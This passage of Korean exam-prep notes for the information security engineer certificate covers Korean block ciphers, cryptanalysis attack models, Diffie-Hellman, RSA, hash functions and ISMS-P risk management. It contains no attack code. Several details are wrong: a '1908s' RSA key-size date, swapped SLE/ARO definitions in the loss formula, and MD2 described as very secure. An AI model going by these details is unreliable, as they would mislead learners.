KISA, ETRI(국제표준)       IBM(레거시 시스템 표준)       Rijndael(미국 NIST 표준)           3. 국내에서 개발한 암호화 알고리즘 종류     HIGHT            HIGh security and light weigHT       RFID, USN 등과 같이 저전력, 경량화를 요구하는 컴퓨팅 환경에서 기밀성을 제공       64Bit 블록 암호화 알고리즘       KISA, ETRI, 고려대학교 공동 개발           ARIA            경량 환경 및 하드웨어 구현을 위해서 최적화된 Involutional SPN 구조를 가지는 범용 블록 암호화 알고리즘       128Bit 블록       128/192/256 Bit 키 길이           LEA            Lightweight Encryption Algorithm       빅데이터, 클라우드 등 고속 환경 및 모바일 기기 등 경량 환경에서 기밀성 제공       128Bit 블록 암호화 알고리즘           LSH 해시함수            메시지 인증, 사용자 인증, 전자서명 등 다양한 암호 응용분야에서 활용 가능한 암호학적 해시함수           암호분석 방법  1. 암호분석 방법의 종류                  공격       주요 설명                       암호문 단독 공격 (COA, Ciphertext only Attack)       ⦁ 암호 해독자에게 가장 불리한 방법 ⦁ 공격자는 단지 암호문만을 가지고 공격 ⦁ 암호문으로부터 평문이나 암호키를 찾아내는 방법으로 통계적 성질과 문장의 특성등을 추정하여 해독                 알려진 평문 공격 (KPA, Known Plaintext Attack)       ⦁ 암호문에 대응하는 일부 평문이 가용한 상황에서의 공격, 선형 공격 ⦁ 공격자는 약간의 평문에 대응하는 암호문을 가지고 있는 상태에서 나머지 암호문에 대한 공격을 하는 방법으로 이미 입수한 암호문의 관계를 이용하여 새로운 암호문을 해독하는 방법                 선택 평문 공격 (CPA, Chosen Plaintext Attack)       ⦁ 평문을 선택하면 대응되는 암호문을 얻을 수 있는 상황에서의 공격 ⦁ 공격자가 사용된 암호기에 접근할 수 있을 때 사용하는 공격 방법 ⦁ 적당한 평문을 선택하여 그 평문에 대응하는 암호문을 얻을 수 있음                 선택 암호문 공격 (CCA, Chosen Ciphertext Attack)       ⦁ 암호문을 선택하면 대응되는 평문을 얻을 수 있는 상태에서의 공격 ⦁ 적당한 암호문을 선택하고 그에 대응하는 평문을 얻을 수 있다.           디피헬먼(Diffie-Hellman) 키 교환 알고리즘  1. Diffie-Hellman 키 교환 알고리즘 개념 및 특징     최초의 공개키 암호화 알고리즘   1976년 미국 스탠퍼드 대학 연구원 W.Diffie와 M.Hellman이 공동으로 개발한 암호화 방식   공개키는 1개의 정수와 1개의 소수로 통신 직전에 통신하고자 하는 상대방과 공유   다른 비밀키 전용의 숫자는 양쪽에서 각각 보유하도록 하여 이들과 공개키의 수치를 사용하여 공통 암호키용 수치를 산출하는 방식   IPSEC에서 IKE(Inter Key Exchange)의 디폴트 키 교환 알고리즘으로 채택됨   중간자 공격(MITM, Man-in-the-middle) 공격에 취약한 문제점을 가짐   2. Diffie-Hellman 키 교환 과정     키 교환 과정            송신자 A는 소수 P, 그리고 1부터 p-1까지의 정수 g를 선택하여 사전에 수신자 B와 공유       송신자 A는 정수 a를 선택(정수 a는 외부 미공개, 수신자 B도 알 수 없음)       송신자 A는 g^a mod p, 즉 g^a를 p로 나눈 나머지를 계산       수신자 B도 마찬가지로 정수 b를 선택, B=g^b mod p 를 계산       송신자 A와 수신자 B가 서로에게 A와 B를 전송       송신자 A가 B^a mod p, 수신자 B가 A^b mod p를 계산       마지막 단계에서 B^a = (g^b)^a = (g^a)^b, A^b = (g^a)^b = g^ab 이며, 따라서 K=g^ab mod p 라는 공통의 비밀키가 공유됨           혼합 암호화  1. 대칭키(비밀키) 암호화 기법과 공개키(비대칭키) 암호화 기법의 장/단점     대칭키 암호화 기법            장점 : 공개키 암호화 기법에 비해서 속도가 빠름       단점 : 송수신자 중 누군가가 암호화키를 유출하면 모든 암호문이 복호화됨           공개키 암호화 기법            장점 : 암호화와 복호화 키가 다르므로 유출의 문제 해결       단점 : 키 길이가 길고 속도가 느림           혼합 암호화            대칭키 암호화와 공개키 암호화의 장점을 결합                    속도가 빠르다.           암호화 키와 복호화 키가 다르다.                       SSL, IPSEC, 전자서명 등 거의 모든 부분에서 사용           2. 문제 해결     혼합 암호화의 단점            어떤 암호화 기법도 동일한 암호화키를 계속 사용하면 평문과 암호문간의 관계를 파악할 수 있어 문제가 됨       의도적인 암호화 키 유출에서 자유롭지 않음           세션 키            연결할 때마다 새롭게 생성된 키를 암호화 키로 사용       대칭키로 사용                  이미지 출처       상호 인증            세션 키 공유도 중간자 공격에서 자유롭지 않음       인증기관이 클라이언트 인증서와 서버 인증서를 발급하고 인증서는 정당한 사용자만 확인할 수 있도록 함       인증기관에 등록하고 등록 이후 인증서를 확인할 수 있는 키를 받음       상대방의 정보(웹브라우저, IP 등)와 시간 정보를 입력 값으로 하여 난수를 만들고, 난수를 세션키로 사용 (난수발생기 활용)           RSA(Rivest, Shamir, Adelman)  1. RSA 개념 및 특징     1976년 공개키 암호 방식의 개념 등장 이후에 1978년 Rivest, Shamir, Adelman 이 개발한 암호화 방식   대표적인 공개키 암호화 방식으로 De-Facto Standard(산업표준)이다.   소인수분해의 어려움을 기반으로 안정성을 제공한다.   암호화 및 디지털 서명 용도로 사용이 가능하다.   2. RSA 암호화 및 복호화 과정      이미지 출처   A와 B가 보안이 보장되어 있지 않은 환경에서 서로 비밀 메시지를 주고 받고 싶다고 가정하자. B가 A에게 메시지를 전달하기 위해서는 A의 공개키가 필요하다. A는 아래와 같은 방법을 통해 그만의 공개키와 개인키를 제작한다.      이미지 출처   A의 공개키는 위에서 구한 두 개의 숫자로 이루어진 &lt;N, e&gt;이고, 개인키는 &lt;N, d&gt;이다. A는 &lt;N, e&gt;만을 B에게 공개하고, B는 이 공개키를 사용하여 자신의 메시지를 암호화하게 된다. 여기서 p와 q의 보안은 매우 중요하다. 이를 가지고 d와 e의 계산이 가능하기 때문이다. 그리하여 공개키와 개인키가 생성이 된 후에는 이 두 숫자를 지워버리는 것이 안전하다.   3. RSA 안전성 확보                  구분       안정성 확보                       소수 선택       ⦁ p, q는 거의 같은 크기의 소수여야 안전함 ⦁ p-1, q-1은 큰 소수를 인수로 가져야 안전함 ⦁ p-1, q-1의 최대 공약수는 작아야 안전함                 키 사이즈       1908년대까지 512Bit, 1996년에는 1024Bit, 2005년에는 2048Bit 권장           해시(Hash)함수  1. 해시(Hash) 알고리즘 특징     키가 없고 복호화가 불가능한 특징을 가지는 암호화 방식, 일방향 암호 기술   MD(Message Digest)는 무결성만 제공하는 메커니즘   다양한 길이의 입력을 고정된 짧은 길이의 출력으로 변환하는 함수(고정 길이 출력: 128Bit, 160Bit, 256Bit 등)   표현 방식 : y=h(x)에서 x 는 가변 길이의 메시지, y는 해시함수를 통해서 생성, h는 해시값(Hash code)을 생성   2. 해시함수의 조건                  조건       설명                       압축       임의 길이의 평문을 고정된 길이의 출력 값으로 변환함                 일방향 (One Way Function, 선이미지 회피성)       매시지에서 해시값(Hash code)을 구하는 것은 쉽지만 반대로 해시값에서 원래 메시지를 구하는 것은 매우 어려움(역방향 계산 불가능)                 효율성       메시지로부터 h(메시지)를 구하는 데 많은 자원과 노력이 소요되지 않아야 함                 충돌회피 (Collision free, 강한 충돌회피성)       ⦁ 다른 문장을 사용하였는데도 동일한 암호문이 나오는 현상 ⦁ h(M1)=h(M2)인 서로 다른 M1과 M2를 구하기는 계산상 불가능해야 함                 2차 선이미지 회피성       ⦁ 어떤 블록 x에 대해서 H(y)=H(x)인 y != x인 것을 찾는 것이 계산적으로 불가능해야 함 ⦁ 약한 충돌 회피성           3. Salt     동일한 값을 입력하였으나 다른 해시 값이 나오는 경우 (예: 리눅스 패스워드 해시값)   리눅스만 알고 있는 임의의 값(Salt)을 추가해서 해시함   4. 해시함수 종류                  종류       특징                       MD2       ⦁ Rivest 가 개발한 것으로 8Bit 컴퓨터를 위해 고안됨 ⦁ 매우 안전하지만 계산할 때 많은 시간이 걸림 ⦁ 128Bit의 출력 해시값을 생성                 MD4       ⦁ Rivest 가 개발, MD2 보다 메시지 압축 속도가 빠름 ⦁ 속도가 빠른 반면 안정성이 떨어짐 ⦁ 128Bit 출력 해시값 생성                 MD5       ⦁ Rivest 가 개발, 안정성이 떨어지는 MD4 알고리즘을 수정하여 만듦 ⦁ 128Bit의 출력 해시 값을 생성                 SHA       Secure Hash Algorithm, MD 계열의 알고리즘과는 달리 160Bit의 출력 해시값을 생성                 SHA-1       미국 표준의 메시지 압축 알고리즘으로 160Bit의 출력 해시값을 생성              국내에서 해시함수를 통하여 주민등록번호 및 패스워드 암호화 시 가장 권고하는 해시함수는 SHA-256임   1. MD5 (Message Digest Algorithm 5)     데이터 무결성을 보장하기 위한 단방향 해시함수   임의의 길이를 입력받아서 128Bit의 해시 값을 출력   고속연산이 가능, 공개키 알고리즘 및 대칭키 암호화 알고리즘보다 계산시간이 적게 걸림   메시지를 512Bit의 블록으로 나누고 128Bit를 출력함   2. SHA (Secure Hash Algorithm)     미국 국가안보국(NSA) 에서 1993년 처음으로 설계해서 미국 표준으로 제정   인터넷뱅킹, 전자서명, 메시지 인증코드, 키 교환 알고리즘, 키 생성 알고리즘 등에 사용   MD4 해시 알고리즘 기반으로 만들어진 해시함수, 가장 널리 사용됨   안정성이 검증되었으며, SHA-256, SHA-384, SHA-512 등이 있음   3. 국내 해시함수 알고리즘 LSH     국내 TTA 표준으로 제정되었으며 지적재산권에 대한 사용료 없이 사용가능   LSH는 메시지 인증, 사용자 인증, 전자서명 등의 다양한 암호 응용 분야에서 사용할 수 있는 해시함수   2014년 개발 되었고 224Bit, 256Bit, 384Bit, 512Bit 를 지원   국제표준인 SHA2와 SHA3에 비해서 2배 이상의 성능을 가지고 있음   5. 생일자 공격(Birthday Attacks)     23명 중에서 같은 생일을 가지는 사람이 두 사람이나 그 이상이 있을 확률은 1/2보다 크다는 결과이다.   생일자 역설을 근거로 한 해시함수의 최소 비트는 160비트 이상이 되어야 한다.   6. 랜덤 오라클 모델     가장 이상적인 해시함수 모델로 사용자가 원하는 대로 오라클의 크기를 변경해서 사용할 수 있다.   ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보안 일반","암호학"],
        "url": "https://bluesplatter.com/is_certification/ISCert-04IS-04Cryptography/",
        "teaser": null
      },{
        "title": "05.정보보호 관리 - 01.정보보호 관리",
        "excerpt":"정보보호 관리 이해  1. ISMS-P     개념            정보보호 및 개인정보보호 관리체계(ISMS-P : Information Security Management System-Personal)                    과학기술정보통신부가 공시한 “정보보호 관리체계 인증 등에 관한 고시” 와 방송통신위원회와 행정안전부가 공동 고시한 “개인정보보호 관리체계 인증 등에 관한 고시”의 내용을 통합하여 “정보보호 및 개인정보보호 관리체계 인증 등에 관한 고시”로 공동으로 개정하여 고시함                           2. ISMS-P 인증의 구성                  구성       설명                       ISMS 인증       ⦁ ISMS 의무인증 기업이 받아야 하는 인증으로 관리체계 수립 및 운영, 보호대책 요구사항에 대해서 인증 ⦁ 정보통신망법(정보통신망 이용촉진 및 정보 보호 등에 관한 법률)을 근거로 함 ⦁ 한국인터넷진흥원에서 인증을 부여 ⦁ 정보통신서비스를 제공하는 정보통신 제공자에 대한 인증                 ISMS-P 인증       ISMS 인증을 받은 기업이 개인정보 처리 단계별 요구사항의 인증기준을 준수하면 부여되는 인증           3. ISMS-P 인증의 법적 근거     정보통신망법과 개인정보보호법을 근간으로 &lt;정보보호 및 개인정보보호 관리체계 인증 등에 관한 고시&gt;을 확정   용어설명            “정보보호 및 개인정보보호 관리체계 인증”이란 ~ 중략 ~ 한국인터넷진흥원(이하 “인터넷진흥원”이라 한다) 또는 인증기관이 증명하는 것을 말한다.       “인증기관”이란 인증에 관한 업무를 수행할 수 있도록 ~ 중략 ~ 과학기술정보통신부장관, 행정안전부장관 및 방송통신위원회가 지정하는 기관을 말한다.       “심사기관”이란 인증심사 업무를 수행할 수 있도록 ~ 중략 ~ 과학기술정보통신부장관, 행정안전부장관 및 방송통신위원회가 지정하는 기관을 말한다.       “인증위원회”란 인터넷진흥원 또는 인증기관의 장이 인증심사 결과 등을 심의, 의결하기 위해 설치, 운영하는 기구로서 위원장과 위원으로 구성된다.           정보보호 및 개인정보보호 관리체계 인증을 위한 협의회 구성            과학기술정보통신부장관, 행정안전부장관 및 방송통신위원회는 정보보호 및 개인정보보호 관리체계 인증 운영에 관한 정책 사항을 협의하기 위하여 정보보호 및 개인정보보호 관리체계 인증 협의회를 운영한다.           정보통신망법            “정보통신서비스 제공자”란 ~ 중략 ~ 전기통신사업자와 영리를 목적으로 전기통신사업자의 전기통신역무를 이용하여 정보를 제공하거나 정보의 제공을 매개하는 자를 말한다.           정보보호 및 개인정보보호 관리체계 인증            자율신청 : 기업이 정보보호 관리체계를 구축, 운영하고 인증 취득을 희망하는 경우, 자율적인 신청을 통한 인증 심사 가능       의무인증 : 기업 스스로 의무대상 여부를 판단하여 ISMS를 구축하고 인증을 취득하는 것이 원칙                ISMS 의무인증 대상자                                  대상자 기준           정보통신서비스 제공자           비고                                           (ISP) 전기통신사업법(대통령령)의 전기통신 사업자로 전국적으로 정보통신망 서비스를 제공하는 사업자           인터넷 접속 서비스, 인터넷 전화 서비스 등           서울 및 모든 광역시에서 정보통신망 제공                             (IDC) 타인의 정보통신 서비스 제공을 위하여 집적된 정보통신 시설을 운영, 관리하는 사업자 (집적정보통신시설 사업자(IDC))           서버 호스팅, 코로케이션(랙 대여) 서비스 등           정보통신서비스 부분 전년도 매출액 100억 이하 영세 VIDC 제외                             (정보통신서비스 제공자) 정보통신서비스 매출액 100억 또는 이용자수 100만 명 이상인 사업자           인터넷 쇼핑몰, 포털, 게임, 예약, Cable-SO 등           정보통신서비스 부분 전년도 매출액 100억 이상 또는 전년도 말 기준 직전 3개월간 일일 평균 이용자 수 100만명 이상 사업자                             연간 매출액 및 세입 등이 1500억 이상인 기업 중 상급종합병원, 1만 이상 재학생이 있는 학교           ⦁ 정보통신제공자가 아니어도 매출액이 1500억 이상인 상급 종합병원 ⦁ 매출액이 1500억 이상이면서 재학생이 1만 이상인 학교           2016년 6월부터 의무인증 대상으로 포함됨                           정보통신망법 제47조            과학기술정보통신부장관은 제2항에 따라 인증을 받아야 하는 자가 과학기술정보통신부령으로 정하는 바에 따라 국제표준 정보보호 인증을 받거나 정보보호 조치를 취한 경우에는 제1항에 따른 인증 심사의 일부를 생략할 수 있다. 이 경우 인증 심사의 세부 생략 범위에 대해서는 과학기술정보통신부장관이 정하여 고시한다.       제1항에 따른 정보보호관리체계 인증의 유효기간은 3년으로 한다.       정보보호 관리체계 인증기관 및 정보보호 관리체계 심사기관 지정의 기준,절차,유효기간 등에 필요한 사항은 대통령령으로 정한다.           미인증 시 3,000만 원 이하 과태료   4. ISMS-P 인증 관리체계          정보보호 및 개인정보보호 관리체계 인증              이미지 출처              이미지 출처            정보보호 및 개인정보보호 관리체계 인증심사 기준              이미지 출처            정보보호 및 개인정보보호 관리체계 인증 신청 절차              이미지 출처       5. ISMS-P 심사종류          인증 심사 종류                                  종류           특징                                           최초심사           ⦁ 정보보호 및 개인정보보호 관리체계 인증 취득을 위한 심사 (인증 기준의 적합여부) ⦁ 범위 변경 등 중요한 변경사항 발생 시 최초 심사                             사후심사           정보보호 및 개인정보보호 관리체계를 지속적으로 유지하고 있는지에 대한 심사(연 1회 이상)                             갱신심사           유효기간(3년) 만료일 이전에 유효기간 연장을 목적으로 하는 심사 (인증 기준의 적합여부)                           6. ISMS-P 인증심사원                  심사원       특징                       심사원(보)       인증심사원 자격 신청 요건을 만족한 자로서 인터넷진흥원이 수행하는 이증심사원 양성과정을 통과하여 자격을 취득한 자                 심사원       심사원(보) 자격 취득자로서 인증심사에 4회 이상 참여하고 심사일수의 합이 20일 이상인 자                 선임심사원       심사원 자격 취득자로서 정보보호 및 개인정보보호 관리체계 인증심사를 3회 이상 참여하고 심사일수의 합이 15일 이상인 자                 책임심사원       인터넷진흥원이 지정           정보보호 거버넌스 체계 수립     순환주기모델 Security PDCA(Plan, Do, Check, Act)            Plan : 정책, 계획, 세부목표, 프로세스, 절차 수립       Do : 정책, 통제, 프로세스의 구현과 운영       Check : 프로세스 성과평가 (Key Performance Indicator), 결과 경영자 검토       Act : 검토 결과에 따른 시정조치와 예방조치           관리체계기반 마련            상위 수준의 정보 보호 정책을 수립       정보보호 관리체계 인증 범위를 확정                    인증 범위 내의 모든 정보 자산은 식별되어야 함           네트워크 및 시스템 구성도 필요                       정보 보호를 전담으로 관리하기 위한 조직 구성, 의사결정체계 구축       위험관리                    자산식별, 위협, 취약점 점검, 위험평가 수행, 보호대책 계획을 수립           위험관리 계획서 작성 : 위험관리 범위, 위험관리 수행 일정, 위험평가 방법 결정           위험평가 수행 후 문서화                       정보 보호 (이행)계획서 (정보 보호 대책 구현)                    각 위험에 대해서 어떻게 대응할 것인지 결정           대응을 위한 계획 수립                       관리체계 운영 (정보보호 관리체계 수립, 이행)                    보호대책 구현           보호대책 공유           운영현황 관리 수행                       관리체계 점검 및 개선                    매년 1회 이상 관리체계를 점검하고 개선           경영진 확인                           정보보호 위험 평가  1. 위험관리  1. 위험관리(Risk Management)의 정의     위험을 식별, 분석, 평가, 보호대책을 수립하는 일련의 활동   조직의 자산을 식별하고 위험을 평가하여 조직의 재해, 장애 등 손실을 최소화하기 위한 절차 혹은 연속적인 행위(위험분석, 평가, 대책)            정성적 위험분석 : 우선순위를 정의       정량적 위험평가 : 영향도를 수치화           2. 위험관리 구성                  구성       설명                       자산(Asset)       조직에 가치가 있는 자원들                 위험(Risk)       위협, 취약점을 이용하여 조직의 자산에 손실, 피해를 가져올 가능성                 위협(Threat)       조직, 기업의 자산에 악영향을 끼칠 수 있는 조건, 사건, 행위                 취약점(Vulnerability)       위협이 발생하기 위한 조건 및 상황           3. 위험관리 체계      이미지 출처      위험관리의 핵심적인 활동 = 위험분석 + 위험평가   위험분석 : 보호 대상, 위협 요소, 취약성 등에 대한 자료 수집 및 분석   위험평가 : 분석 결과를 기초로 보안 현황을 평가하고 적절한 방법을 선택하여 효과적으로 위험 수준을 낮추기 위한 과정   4. 위험관리 활동                  세부 활동       설명                       위험성향(Risk Appetite)       수용할 준비가 된 위험의 총량을 의미하며, 영향의 크기와 발생빈도로 정의됨                 위험허용범위(Risk Tolerance)       위험성향에 근거한 위험수준으로부터 수용 가능한 최대편차                 위험대응(Risk Response)       식별된 위험의 발생 가능성과 영향에 대한 대응조치           2. 위험분석  1. 위험분석 방법론     위험분석 및 평가 방법론으로 과학적이고 정형적(Structured)인 과정   위험을 식별하고 측정하려는 노력과 활동   2. 접근방식에 따른 위험분석 기법                  위험분석 기법       설명                       기준선 접근법 (Base Line Approach)       ⦁ 모든 시스템에 대하여 보호의 기준 수준을 정하고 이를 달성하기 위하여 일련의 보호 대책을 선택 ⦁ 시간 및 비용이 적고 모든 조직에서 기본적으로 필요한 보호 대책 선택이 가능 ⦁ 조직의 특성을 고려하지 않기 때문에, 조직 내에 부서별로 적정 보안 수준보다도 높게 혹은 낮게 보안 통제를 적용 ⦁ 질문서 형태로 구성하고 평가                 전문가 판단 (Informal Approach)       ⦁ 정형화된 방법을 사용하지 않고 전문가의 지식과 경험에 따라서 위험을 분석 ⦁ 비용적인 면에서 작은 조직에 효과적이며, 구조화된 접근 방법이 없으므로 위험을 제대로 평가하기 어렵고 보호 대책의 선택 및 소요비용을 합리적으로 도출하기 어려움 ⦁ 계속적으로 반복되는 보안관리 및 보안감시, 사후관리로 제한됨                 상세위험분석 (Detailed Risk Analysis)       ⦁ 자산의 가치를 측정하고 자산에 대한 위협 정도와 취약점을 분석하여 위험 정도를 결정 ⦁ 조직 내에 적절한 보안 수준 마련 가능 ⦁ 전문적인 지식과 노력이 많이 소요됨 ⦁ 정성적 분석 기법과 정량적 분석 기법이 존재함                 복합적 접근법 (Combined Approach)       ⦁ 먼저 조직 활동에 대한 필수적이고 위험이 높은 시스템을 식별하고 이러한 시스템은 상세위험분석 기법을 적용 ⦁ 그렇지 않은 시스템은 기준선 접근법 등을 적용 ⦁ 보안 전략을 빠르게 구축할 수 있고, 상대적으로 시간과 노력을 효율적으로 활용 가능 ⦁ 두 가지 방법의 적용 대상을 명확하게 설정하지 못함으로써 자원 낭비가 발생할 가능성이 있음           3. 정량적 위험분석과 정성적 위험분석                  구분       정량적 위험분석       정성적 위험분석                       개념       ALE(연간기대손실)=SLE(위험발생확률)*ARO(손실크기)를 통해 기대 위험가치 분석       ⦁ 손실 크기를 화폐가치로 표현하기 어려움 ⦁ 위험 크기는 기술변수로 표현(척도:점수)                 기법 유형       수학공식 접근법, 확률 분포 추정법, 확률 지배, 몬테카를로 시뮬레이션, 과거 자료 분석법       델파이법, 시나리오법, 순위 결정법, 질문서법                 장점       ⦁ 비용/가치 분석, 예산 계획, 자료 분석이 용이 ⦁ 수리적 계산으로 논리적이고 객관적인 정보를 얻을 수 있음       ⦁ 금액화하기 어려운 정보의 평가 가능 ⦁ 분석시간이 짧고 이해가 쉬움                 단점       ⦁ 분석 시간, 노력, 비용이 큼 ⦁ 정확한 정량화 수치를 얻기 어려움       ⦁ 평가 결과가 주관적임 ⦁ 비용효과 분석이 쉽지 않음              확률분포법            미지의 사건을 추정하는 데 사용되는 방법       미지의 사건을 확률적(통계적) 편차를 이용하여 최저, 보통, 최고의 위험평가를 예측       정확성이 낮음           시나리오법            어떤 사건도 기대대로 발생하지 않는다는 사실에 근거       일정 조건하에서 위협에 대한 발생 가능한 결과들을 추정       적은 정보를 가지고 전반적인 가능성을 추론할 수 있음       발생 가능한 사건의 이론적인 추측에 불과하고 정확도, 완성도, 이용기술의 수준 등이 낮음           4. 위험에 따른 손실액 분석                  손실액 분석       설명                       ARO (Annualized Rate of Occurrence)       매년 특정한 위협이 발생할 가능성에 대한 빈도수, 혹은 특정 위협이 1년에 발생할 예상 빈도수                 SLE (Single Loss Expectancy)       ⦁ 특정 위협이 발생하여 예상되는 1회 손실액 ⦁ SLE = 자산가치 * EF(1회 손실액)                 ALE (Annualized Loss Expectancy)       정량적인 위협분석의 대표적인 방법으로 특정 자산에 대하여 실현된 위협의 모든 경우에 대해서 가능한 연간 비용(연간 예상 손실)           5. 정보보호 대책 선정 및 이행계획 수립          위험대응 전략                                  전략           특징                                           위험수용           위험을 받아들이고 비용을 감수                             위험감소           위험을 감소시킬 수 있는 대책을 채택하여 구현                             위험회피           위험이 존재하는 프로세스나 사업을 포기                             위험전가           잠재적 비용을 제3자에게 이전하거나 할당                           정보보호 대책 구현 및 운영     ISMS-P 읽어보기            관리체계 수립 및 운영                    관리체계 기반 마련           위험관리           관리체계 운영           관리체계 점검 및 개선                       보호대책 요구사항                    정책           조직 자산관리           인적 보안           외부자 보안           물리보안           인증 및 권한관리           접근 통제           암호화 적용           정보시스템 도입 및 개발보안           시스템 및 서비스 운영 관리           시스템 및 서비스 보안 관리           사고예방 및 대응           재해복구                       개인정보 처리 단계별 요구사항           1. 관리체계 수립 및 운영  1. 관리체계 기반 마련     경영진의 참여 : 최고경영자는 정보보호 및 개인정보보호 관리체계의 수립과 운영활동 전반에 경영진의 참여가 이루어질 수 있도록 보고 의사결정 체계를 수립하여 운영하여야 한다.   최고책임자의 지정 : 최고경영자는 정보보호 업무를 총괄하는 정보보호 최고책임자와 개인정보보호 업무를 총괄하는 개인정보보호 책임자를 예산, 인력 등 자원을 할당할 수 있는 임원급으로 지정하여야 한다.   조직 구성 : 최고경영자는 정보보호와 개인정보보호의 효과적 구현을 위한 실무조직, 조직 전반의 정보보호와 개인정보보호 관련 주요 사항을 검토 및 의결할 수 있는 의원회, 전사적 보호활동을 위한 부서별 정보보호와 개인정보보호 담당자로 구성된 협의체를 구성하여 운영하여야 한다.   범위 설정 : 조직의 핵심 서비스와 개인정보 처리 현황 등을 고려하여 관리체계 범위를 설정하고, 관련된 서비스를 비롯하여 개인정보 처리 업무와 조직, 자산, 물리적 위치 등을 문서화하여야 한다.   정책 수립 : 정보보호와 개인정보보호 정책 및 시행문서를 수립, 작성하며, 이때 조직의 정보보호와 개인정보보호 방침 및 방향을 명확하게 제시하여야 한다. 또한 정책과 시행문서는 경영진의 승인을 받고, 임직원 및 관련자에게 이해하기 쉬운 형태로 전달하여야 한다.   자원 할당 : 최고경영자는 정보보호와 개인정보보호 분야별 전문성을 갖춘 인력을 확보하고, 관리체계의 효과적 구현과 지속적 운영을 위한 예산 및 자원을 할당하여야 한다.   2. 위험 관리     정보자산 식별 : 조직의 업무특성에 따라 정보자산 분류기준을 수립하여 관리체계 범위 내 모든 정보자산을 식별,분류하고 중요도를 산정한 후 그 목록을 최신으로 관리하여야 한다.   현황 및 흐름 분석 : 관리체계 전 영역에 대한 정보서비스 및 개인정보 처리 현황을 분석하고 업무절차와 흐름을 파악하여 문서화하며, 이를 주기적으로 검토하여 최신성을 유지하여야 한다.   위험 평가 : 조직의 대내외 환경 분석을 통해 유혀별 위협정보를 수집하고 조직에 적합한 위험 평가 방법을 선정하여 관리체계 전 영역에 대하여 연 1회 이상 위험을 평가하며, 수용할 수 있는 위험은 경영진의 승인을 받아 관리하여야 한다.   보호대책 선정 : 위험 평가 결과에 따라 식별된 위험을 처리하기 위하여 조직에 적합한 보호대책을 선정하고, 보호대책의 우선순위와 일정,담당자,예산 등을 포함한 이행계획을 수립하여 경영진의 승인을 받아야 한다.   3. 관리체계 운영     보호대책 구현 : 선정한 보호대책은 이행계획에 따라 효과적으로 구현하고, 경영진은 이행결과의 정확성과 효과성 여부를 확인하여야 한다.   보호대책 공유 : 보호대책의 실제 운영 또는 시행할 부서 및 담당자를 파악하여 관련 내용을 공유하고 교육하여 지속적으로 운영되도록 하여야 한다.   운영현황 관리 : 조직이 수립한 관리체계에 따라 상시적 또는 주기적으로 수행하여야 하는 운영활동 및 수행 내역은 식별 및 추적이 가능하도록 기록하여 관리하고, 경영진은 주기적으로 운영활동의 효과성을 확인하여 관리하여야 한다.   4. 관리체계 점검 및 개선     법적 요구사항 준수 검토 : 조직이 준수하여야 할 정보보호 및 개인정보보호 관련 법적 요구사항을 주기적으로 파악하여 규정에 반영하고, 준수 여부를 지속적으로 검토하여야 한다.   관리체계 점검 : 관리체계가 내부 정책 및 법적 요구사항에 따라 효과적으로 운영되고 있는지 독립성과 전문성이 확보된 인력을 구성하여 연 1회 이상 점검하고, 발견된 문제점을 경영진에게 보고하여야 한다.   관리체계 개선 : 법적 요구사항 준수검토 및 관리체계 점검을 통해 식별된 관리체계상의 문제점에 대한 원인을 분석하고 재발방지 대책을 수립,이행하여야 하며, 경영진은 개선 결과의 정확성과 효과성 여부를 확인하여야 한다.   2. 보호대책 요구사항  1. 정책, 조직, 자산관리     정책의 유지관리 : 정보보호 및 개인정보보호 관련 정책과 시행문서는 법령 및 규제, 상위조직 및 관련 기관 정책과의 연계성, 조직의 대내외 환경변화 등에 따라 주기적으로 검토하여 필요한 경우 제,개정하고 그 내역을 이력 관리하여야 한다.   조직의 유지관리 : 조직의 각 구성원에게 정보보호와 개인정보보호 관련 역할 및 책임을 할당하고, 그 활동을 평가할 수 있는 체계와 조직 및 조직의 구성원 간 상호 의사소통할 수 있는 체계를 수립하여 운영하여야 한다.   정보자산 관리 : 정보자산의 용도와 중요도에 따른 취급 절차 및 보호대책을 수립, 이행하고, 자산별 책임소재를 명확히 정의하여 관리하여야 한다.   2. 인적 보안     주요 직무자 지정 및 관리 : 개인정보 및 중요정보의 취급이나 주요 시스템 접근 등 주요 직무의 기준과 관리방안을 수립하고, 주요 직무자를 최소한으로 지정하여 그 목록을 최신으로 관리하여야 한다.   직무 분리 : 권한 오,남용 등으로 인한 잠재적인 피해 예방을 위하여 직무 분리 기준을 수립하고 적용하여야 한다. 다만 불가피하게 직무 분리가 어려운 경우 별도의 보완대책을 마련하여 이행하여야 한다.   보안 서약 : 정보자산을 취급하거나 접근권한이 부여된 임직원, 임시직원, 외부자 등이 내부 정책 및 관련 법규, 비밀유지 의무 등 준수사항을 명확히 인지할 수 있도록 업무 특성에 따른 정보보호 서약을 받아야 한다.   인식제고 및 교육훈련 : 임직원 및 관련 외부자가 조직의 관리체계와 정책을 이해하고 직무별 전문성을 확보할 수 있도록 연간 인식제고 활동 및 교육훈련 계획을 수립, 운영하고, 그 결과에 따른 효과성을 평가하여 다음 계획에 반영하여야 한다.   퇴직 및 직무변경 관리 : 퇴직 및 직무변경 시 인사, 정보보호, 개인정보보호, IT 등 관련 부서별 이행하여야 할 자산반납,계정 및 접근권한 회수, 조정, 결과확인 등의 절차를 수립, 관리하여야 한다.   보안 위반 시 조치 : 임직원 및 관련 외부자가 법령, 규제 및 내부정책을 위반한 경우 이에 따른 조치절차를 수립, 이행하여야한다.   3. 외부자 보안     외부자 현황 관리 : 업무의 일부(개인정보취급, 정보보호, 정보시스템 운영 또는 개발 등)를 외부에 위탁하거나 외부의 시설 또는 서비스(집적정보통신시설, 클라우드 서비스, 애플리케이션 서비스 등)를 이용하는 경우 그 현황을 식별하고 법적 요구사항 및 외부 조직, 서비스로부터 발생되는 위험을 파악하여 적절한 보호대책을 마련하여야 한다.   외부자 계약 시 보안 : 외부 서비스를 이용하거나 외부자에게 업무를 위탁하는 경우 이에 따른 정보보호 및 개인정보보호 요구사항을 식별하고, 관련 내용을 계약서 또는 협정서 등에 명시하여야 한다.   외부자 보안 이행 관리 : 계약서, 협정서, 내부정책에 명시된 정보보호 및 개인정보보호 요구사항에 따라 외부자의 보호대책 이행 여부를 주기적인 점검 또는 감사 등 관리,감독하여야 한다.   외부자 계약 변경 및 만료 시 보안 : 외부자 계약만료, 업무종료, 담당자 변경 시에는 제공한 정보자산 반납, 정보시스템 접근계정 삭제, 중요정보 파기, 업무 수행 중 취득정보의 비밀유지 확약서 징구 등의 보호대책을 이행하여야 한다.   4. 물리 보안     보호구역 지정 : 물리적,환경적 위협으로부터 개인정보 및 중요정보, 문서, 저장매체, 주요 설비 및 시스템 등을 보호하기 위하여 